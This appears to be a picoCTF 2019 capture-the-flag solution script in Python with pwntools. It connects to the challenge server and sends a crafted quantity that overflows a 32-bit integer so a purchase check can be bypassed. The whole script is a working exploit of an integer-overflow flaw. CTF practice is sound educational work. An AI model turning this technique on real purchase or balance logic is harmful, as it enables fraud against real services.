#!/usr/bin/env python

from pwn import *

r = remote("2019shell1.picoctf.com", 29250)
r.recvuntil(" Enter a menu selection\n")
r.sendline("2")
r.sendline("1")
r.recvuntil(" enter desired quantity\n")
val = (2**31 / 900) + 10
print val
r.sendline(str(val))
r.sendline("2")
r.sendline("2")
r.sendline("1")

r.interactive()
r.close()
